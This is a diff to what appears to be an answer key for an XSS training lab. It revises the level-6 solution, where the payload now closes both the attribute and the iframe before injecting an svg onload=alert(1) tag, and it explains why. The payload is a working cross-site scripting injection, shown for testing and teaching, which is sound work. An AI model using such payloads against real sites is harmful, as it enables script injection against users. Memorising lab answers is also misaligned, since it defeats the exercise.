@@ -39,7 +39,7 @@ Reflection inside URL query parameter values placed in href/src/action attribute
 
 ### url-param-ctx-level6
 
-`/url-param-ctx/level6/?query=%22%3E%3Csvg%20onload=alert(1)%3E`
+`/url-param-ctx/level6/?query=%22%3E%3C/iframe%3E%3Csvg%20onload=alert(1)%3E`
 
-- payload: `"><svg onload=alert(1)>`
-- context: iframe src URL param — break out, inject sibling tag
+- payload: `"></iframe><svg onload=alert(1)>`
+- context: iframe src param; close the attribute and the iframe (fallback content is inert)
